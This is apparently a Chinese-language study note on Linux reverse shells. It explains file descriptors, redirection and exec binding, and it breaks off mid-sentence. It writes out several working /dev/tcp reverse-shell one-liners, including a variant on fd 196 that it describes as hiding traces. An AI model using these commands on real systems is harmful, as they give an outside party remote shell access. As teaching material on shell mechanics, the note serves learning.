# Linux反弹shell学习

>废话不多说直接进入正题

这里感谢贾师傅提供的学习链接<br>[Linux反弹shell（一）](https://xz.aliyun.com/t/2548)
[Linux反弹shell（二）](https://xz.aliyun.com/t/2549)

反弹方式也有很多种，不过都离不开重定向，所以这篇文章还是更多的记录这方面的东西

## 文件描述符

咱这儿是web所以我就简单理解了下，大概是在打开文件时会使用文件描述符去定义输入输出或者错误输出，默认的文件描述符是：
 - **0 ->标准输入（默认键盘）**
 - **1 ->标准输出（默认显示器）**
 - **2 ->错误输出（默认显示器）**
比如现在打开一个文件，要写入时，它标准输入默认是键盘，则你输入就是从键盘进行写入；要显示文件内容，它标准输出的默认是显示器，所以显示则是从显示器进行输出。先列一个反弹指令:
`bash -i >& /dev/tcp/ip/port <&2`
`>&`即是将输出输入及错误输出都定向到
`/dev/tcp/ip/port`
这个文件中，但实际上这个文件是不存在的，它是和该ip上的该端口建立的一个连接吧，重定向到这里后，再执行bash -i ，如果你对你的ip：port进行监听，即可获得反弹的shell，因为现在对方该指令的输入，输出错误输出都定向到了自己这里，你的输入便是它获取的输入，它的输出便是你看到的输出。

## 输入输出重定向

用<和>即可完成输入输出的重定向
- 输入是<
- 输出是>
用法相同，都是<br>**[文件描述符]< [文件名]**
这种格式，即为将某文件描述符重新定向到这个文件，如不输入数字，则是<,>默认代表的文件描述符，即0和1。

## 文件描述符的复制

比上面那个重定向多了一个&
格式如下：
**[文件描述符1]<&[文件描述符2]**
**[文件描述符1]>&[文件描述符2]**
两者都是把文件描述符1复制到了文件描述符2的定向上，第一个是只读形式打开，第二个是以写入形式打开，区别不大。<br> 需要注意的是，文件描述符的复制是从左到右进行的，所以在重定向时需要注意指令的位置。如以下两个命令的区别：
- `cmd > file 2>&1`
是先将1（标准输出）定向到file文件。再把2（标准错误输出）复制到1，即file文件上，则1（标准输出）和2（标准错误输出）都在file文件上
- `cmd 2>&1 > file`
先把2（标准错误输出）复制到1（标准输出）上，再把1（标准输出）重定向到file文件上，区别在于，现在2（标准错误输出）是在以前1（标准输出）所在的文件上而现在的1（标准输出）是在file文件上。

## exec 绑定重定向
用法与上面的相同。但是上面的重定向只能在当前指令中使用，也就是说你想重定向的话每一句指令都需要重新进行重定向，而exec就能帮你直接绑定，不需要每局指令再重新进行重定向。
格式如下：
**exec [文件描述符]< [文件描述符]**
**exec [文件描述符]> [文件名]**
**exec [文件描述符]<> [文件名]**

在大多数情况中都是用exec绑定一个自定的文件描述符（即除0，1，2之外的一个数），再将0，1，2复制到该文件描述符去，这样不会影响标准输入输出和错误输出的正常使用，做到了隐藏痕迹的效果。比如这样：
`0<&196;exec 196<>/dev/tcp/ip/port; ls <&196 >&196 2>&196`
就是将0，1，2复制到了一个自定的196文件描述符上并把196绑定到了攻击者那边。
## 反弹shell
现在再来理解反弹shell就简单多了，就是想办法将命令行的标准输入标准输出以及标准错误输出转到攻击者这边，攻击者就可以从他那边使用该电脑的终端，就得到了shell。
比如这样
`bash -i > /dev/tcp/ip/port 0>&1 2>&1`
就将标准输出重定向到了该ip的主机上，又将标准输入和标准错误输出复制到了标准输出的






